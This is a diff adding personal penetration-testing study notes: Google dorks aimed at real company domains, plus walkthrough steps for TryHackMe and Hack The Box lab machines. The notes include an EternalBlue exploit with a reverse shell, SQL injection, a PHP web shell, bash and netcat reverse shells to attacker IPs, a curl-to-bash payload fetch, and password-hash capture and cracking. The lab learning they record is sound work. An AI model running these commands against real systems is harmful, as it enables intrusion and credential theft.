@@ -1,0 +1,283 @@
+https://github.com/danielmiessler/SecLists
+https://github.com/int0x33/nc.exe.git
+https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+
+Share badges
+https://tryhackme.com/p/Adoptsomekids?show_achievement_badg=blue
+-----------------------------------------------------------------
+	DORKS
+
+1. My Favorite Google dork
+Start with “site:<domain>”. Then, exclude boring pages with “-www” or other terms until you get to the juicy stuff:
+site:tesla.com -www -shop -share -ir -mfa
+
+2. Pastebin Leaks
+Check out sites like pastebin, jsfiddle, and codebeautify for code left over from developers:
+site:pastebin.com
+site:jsfiddle.net
+site:codebeautify.org
+site:codepen.io "tesla.com"
+
+3. PHP extension w/ parameters
+Use “ext:php” and “inurl:?” along with the domain to find .php files with a question mark in the url:
+site:tesla.com ext:php inurl:?
+
+5. Disclosed XSS and Open Redirect Bug Bounties
+Look through both fixed and unfixed bug bounties publicly disclosed through OpenBugBounty:
+site:openbugbounty.org inurl:reports intext:"yahoo.com"
+
+4. Combine your dorks
+Use the “|” operator to include both queries or the “&” operator to require both queries. Here’s an example of attempting to search for file upload endpoints across multiple domains:
+(site:tesla.com | site:teslamotors.com) & ”choose file”
+--------------------------------------------------------------------
+	WSL
+wsl --list --online
+wsl --install -d Kali Linux
+wsl.exe --status
+wsl -l -v
+
+wget -O kali-archive-keyring_2022.1_all.deb https://http.kali.org/kali/pool/main/k/kali-archive-keyring/kali-archive-keyring_2022.1_all.deb
+
+
+get-date will provide the date from the Windows file system and wsl date will provide the date from the Linux file system.
+wsl pwd
+wsl.exe (Open default installed)
+
+
+If we have an error with wsl or the reboot
+Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux.
+
+----------------------------------------------------------------
+	LINUX (General)
+
+uname -a
+hostname -I
+----------------------------------------------------------------
+	TryHackme
+
+*BLUE WINDOWS7 MACHINE*
+	Recon
+
+nmap -sV -vv --script vuln TARGET_IP
+Ports under 1000 = 3
+
+	Gain Access
+
+msfconsole
+search ms17–010
+exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/shell/reverse_tcp
+set lhost ipvpn
+
+	Escalate
+
+ctrl+z or background
+post/multi/manage/shell_to_meterpreter
+set session 1
+getsystem
+getuid
+migrate PID
+
+	Cracking
+
+hashdump
+john --show --format=NT /home/kali/pass.hash
+hashcat -a 0 -m 1000 --username pass.hash /usr/share/wordlists/rockyou.txt --force --show
+https://crackstation.net/
+
+	Find flags! 
+
+type filename :IMPRIME CONTENIDO DESDE WSHELL
+search -f flag*.txt
+
+------------------------------------------------------
+	Hack The Box
+settarget ip
+
+MEOW
+p 23 Telnet
+telnet ip
+
+FAWN
+p 21 ftp
+sudo apt install -y (-y switch at the end of the command is used to accept the installation without interrupting the process
+to ask you if you'd like to proceed.)
+ftp ip
+get
+
+DANCING
+p 445 smb - During scanning, we will typically see port 445 TCP open on the target, reserved for the SMB protocol
+SMB runs at the Application or Presentation layers of the OSI model
+smbclient -L ip ([-L|--list=HOST] : Selecting the targeted host for the connection request.)
+smbclient \\\\10.129.216.6\\ADMIN$ OR smbclient \\\\10.129.216.6\\C$ OR sudo smbclient \\\\10.129.216.6\\WorkShares
+get flag.txt
+
+REDEEMER
+Redis (REmote DIctionary Server) is an open-source advanced NoSQL key-value data store used as a
+database, cache, and message broker
+on this vm 6379 P of tcp
+sudo apt install redis-tools
+nmap -p- -sV 10.129.154.228 -T5
+redis-cli
+-h :host option (redis-cli -h 10.129.154.228)
+info :about redis server (The keyspace section provides statistics on the main dictionary of each database.)
+select :the db what you want
+select 0
+keys * - after -> get <key>
+
+APPOINTMENT
+PII (Personally Identifiable Information)
+-sC: Performs a script scan using the default set of scripts.
+nmap -p- -sC -sV
+A03:2021-Injection
+p 443 HTTPS
+404 Not found errors (HTTP Response)
+p 80  Apache httpd 2.4.38 ((Debian)) ON THIS CASE
+Gobuster (tool used to brute force directories on a webserver)
+git clone https://github.com/danielmiessler/SecLists.git
+gobuster  dir --url http://10.129.102.70/ --wordlist / (Necessary if we want to crack pssw)
+* an example of how authentication works using PHP & SQL:
+To be more precise, here is how the query part of the PHP code gets affected by our input:
+SELECT * FROM users WHERE username='admin'#' AND password='a'
+access to web app with ip target on browser
+admin' or 1=1;#
+
+SEQUEL
+sudo nmap -sC -sS -sV 10.129.139.5
+p 3306 mysql on this case
+sudo apt update && sudo apt install mysql*
+mysql -h 10.129.139.5 -u root
+show databases;
+use htb;
+select * from config;
+
+CROCODILE
+What Nmap scanning switch employs the use of default scripts during a scan? : -sC
+ftp ip - anonymous - get - cat userlist - ...passwd
+gobuster dir -u http://10.129.88.63 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x .php
+login.php
+
+RESPONDER
+We will use a utility called Responder to capture a NetNTLMv2 hash and later use a utility known as john the ripper
+nmap -p- --min-rate 5000 -sV 10.129.32.79
+Windows Remote Management, or WinRM
+Website Enumeration
+On opening Firefox and putting http://[target ip] , the browser returns a message about being unable
+to find that site.
+echo "10.129.32.79 unika.htb" | sudo tee -a /etc/hosts
+Adding this entry in the /etc/hosts file will enable the browser to resolve the hostname unika.htb to
+the corresponding IP address & thus make the browser include the HTTP header
+File Inclusion Vulnerability - LFI & RMI
+Dynamic websites include HTML pages on the fly using information from the HTTP request to include GET
+and POST parameters, cookies, and other variables. It is common for a page to "include" another page
+based on some of these parameters
+What is the name of the URL parameter which is used to load different language versions of the webpage? : page
+ ../../../../../../../../windows/system32/drivers/etc/hosts : Local File Inclusion
+//10.10.14.6/somefile : Remote File Inclusion
+NTLM
+ Which flag do we use in the Responder utility to specify the network interface? :-I
+Responder can do many different kinds of attacks, but for this scenario, it will set up a malicious SMB
+server
+git clone https://github.com/lgandx/Responder
+Location of Responder.conf file -
+-> for default system install : /usr/share/responder/Responder.conf
+-> for github installation : /installation_directory/Responder.conf
+on responder.conf off http - sudo python3 Responder.py -I tun0
+http://unika.htb/?page=//10.10.14.25(Esipatacante)/somefile - We will see on responder the admin hash AN ERROR ON THE PAGE
+But on checking our listening Responder server we can see we have a NetNTLMv for the Administrator user.
+The NetNTLMv2 includes both the challenge (random text) and the encrypted response.
+Hash Cracking
+We can dump the hash into a file and attempt to crack it with john , which is a password hash cracking
+utility.
+We pass the hash file to john and crack the password for the Administrator account. The hash type is
+automatically identified by the john command-line tool.
+echo "pastehash" > hash.txt
+-w : wordlist to use for cracking the hash
+john -w=/usr/share/wordlists/rockyou.txt h - evil-winrm -i 10.129.32.79 -u administrator -p badminton - C:\Users\mike\Desktop\flag.txt
+
+THREE
+Let's further try to identify the technology stack of the website using a browser extension known as Wappalyzer.
+The /etc/hosts file is used to resolve a hostname into an IP address. By default, the /etc/hosts file is
+queried before the DNS server for hostname resolution thus we will need to add an entry in the
+/etc/hosts file for this domain to enable the browser to resolve the address for thetoppers.htb
+Sub-domain enumeration
+A subdomain name is a piece of additional information added to the beginning of a website’s domain name.
+Or, we can visit ctf.hackthebox.com to access the section of the website that is used for CTFs. In this case, ctf is the
+subdomain, hackthebox is the primary domain and com is the top-level domain (TLD). Although the URL
+changes slightly, you’re still on HTB's website, under HTB's domain
+echo "10.129.242.28 thetoppers.htb" | sudo tee -a /etc/hosts
+curl -k http://thetoppers.htb
+gobuster dir -u http://10.129.242.28 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x .php
+gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -u http://thetoppers.htb
+echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
+What is an S3 bucket?
+A quick Google search containing the keywords "s3 subdomain status running" returns this result stating
+that S3 is a cloud-based object storage service.
+ Which service is running on the discovered sub-domain? : amazon s3 ///- sudo apt install awscli /// interact with awscli /// aws configure - temp
+We can list all of the S3 buckets hosted by the server by using the ls command.
+We can also use the ls command to list objects and common prefixes under the specified bucket.
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+We can also use the ls command to list objects and common prefixes under the specified bucket.
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+We can use the following PHP one-liner which uses the system() function which takes the URL parameter cmd as an input and executes it as a system command
+<?php system($_GET["cmd"]); ?>
+Let's create a PHP file to upload.
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command.
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+We can confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php. Let us try executing the OS command id using the URL parameter cmd .
+http://thetoppers.htb/shell.php?cmd=id OR http://thetoppers.htb/shell.php?cmd=whoami
+The response from the server contains the output of the OS command id , which verified that we have code
+execution on the box. Thus, let us now try to obtain a reverse shell.
+sudo nano shell.sh
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.52.136/1337 0>&1
+we will start a ncat listener on our local port 1337 using the following command.: nc -nvlp 1337
+Let's start a web server on our local machine on port 8000 and host this bash file. It is crucial to note here
+that this command for hosting the web server must be run from the directory which contains the reverse
+shell file. So, we must first traverse to the appropriate directory and then run the following command.
+python3 -m http.server 8000
+We can use the curl utility to fetch the bash reverse shell file from our local host and then pipe it to bash
+in order to execute it. Thus, let us visit the following URL containing the payload in the browser.
+http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash
+
+ARCHETYPE
+smbclient -N -L 10.129.27.137
+-N : No password
+-L : This option allows you to look at what services are available on a server
+smbclient -N \\\\10.129.27.137\\backups 
+ Impacket tool includes a valuable python script called
+mssqlclient.py which offers such functionality
+Impacket is a collection of Python classes for working with network protocols.
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip3 install .
+# OR:
+sudo python3 setup.py install
+# In case you are missing some modules:
+pip3 install -r requirements.txt (IF ISNT PYTHON sudo apt install python3 python3-pip)
+Now we are ready to learn about the usage of the tool and specifically of the mssqlclient.py script.
+cd impacket/examples/ --- python3 mssqlclient.py -h --- python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth --- We successfully authenticated to the Microsoft SQL Server!
+help
+SELECT is_srvrolemember('sysadmin');
+In previous cheatsheets, we found also how to set up the command execution through the xp_cmdshell - First it is suggested to check if the xp_cmdshell is already activated by issuing the first command:
+EXEC xp_cmdshell 'net user';
+the activation of xp_cmdshell: 
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure; - Enabling the sp_configure as stated in the above error message
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+Now we are able to execute system commands: xp_cmdshell "whoami"
+git clone https://github.com/int0x33/nc.exe.git --- sudo python3 -m http.server 80 --- sudo nc -lvnp 443 ---
+In order to upload the binary in the target system, we need to find the appropriate folder for that. We will be
+using PowerShell for the following tasks --- The -c flag instructs the powershell to execute the command. --- We found the folder where we will place the binary. To do that, we will use the wget alias within PowerShell
+( wget is actually just an alias for Invoke-WebRequest ): xp_cmdshell "powershell -c pwd" --- xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
+http://10.10.14.9/nc64.exe -outfile nc64.exe" --> FOR ME WHITHOUT ERROR: xp_cmdshell "powershell.exe wget http://[Your_tun0_IP]:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe"
+Now, we can bind the cmd.exe through the nc to our listener: xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443" IF ERROR --> xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe [Your_tun0_IP] 4444"
+Privilege Escalation - Winpeas is an extremely useful tool to enumerate the system for us and find weaknesses. --- https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+python3 -m http.server --- powershell --- wget http://10.10.14.94:8000/winPEASx64.exe -outfile winPEASx64.exe -- .\winPEASx64.exe
+As this is a normal user account as well as a service account, it is worth checking for frequently access files
+or executed commands. To do that, we will read the PowerShell history file, which is the equivalent of
+.bash_history for Linux systems. The file ConsoleHost_history.txt can be located in the directory
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ --- copy admin password --- python3 psexec.py administrator@10.129.148.88 (SINCE impacket/examples) --- rootflag (root.txt on Users/Administrator)
